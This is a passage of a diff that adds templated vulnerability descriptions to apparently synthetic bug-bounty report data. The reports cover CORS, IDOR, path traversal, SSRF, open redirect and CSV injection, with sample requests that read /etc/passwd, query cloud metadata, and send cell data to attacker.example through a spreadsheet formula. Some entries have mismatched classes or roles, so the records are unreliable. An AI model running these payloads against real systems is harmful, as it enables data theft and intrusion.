+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://billing.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17819,7 +17956,8 @@
           "offset": "5d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17910,7 +18048,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://billing.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18028,7 +18167,8 @@
           "offset": "6d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18175,7 +18315,8 @@
           "offset": "5d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18287,7 +18428,8 @@
           "offset": "6d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18411,7 +18553,8 @@
           "offset": "17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://billing.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18558,7 +18701,8 @@
           "offset": "3d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18665,7 +18809,8 @@
           "offset": "2d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18814,7 +18959,8 @@
           "offset": "5d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18902,7 +19048,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19009,7 +19156,8 @@
           "offset": "1d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19139,7 +19287,8 @@
           "offset": "3d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19295,7 +19444,8 @@
           "offset": "5d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19435,7 +19585,8 @@
           "offset": "8d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://billing.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19603,7 +19754,8 @@
           "offset": "4d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19734,7 +19886,8 @@
           "offset": "5d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19893,7 +20046,8 @@
           "offset": "7d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://billing.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20048,7 +20202,8 @@
           "offset": "6d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20178,7 +20333,8 @@
           "offset": "6d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20298,7 +20454,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20382,7 +20539,8 @@
           "offset": "8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20498,7 +20656,8 @@
           "offset": "5d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20637,7 +20796,8 @@
           "offset": "4d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20805,7 +20965,8 @@
           "offset": "5d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20928,7 +21089,8 @@
           "offset": "2d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21045,7 +21207,8 @@
           "offset": "8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21188,7 +21351,8 @@
           "offset": "6d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rheinspitze-energie.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21298,7 +21462,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21450,7 +21615,8 @@
           "offset": "6d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://billing.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21589,7 +21755,8 @@
           "offset": "6d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21713,7 +21880,8 @@
           "offset": "1d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
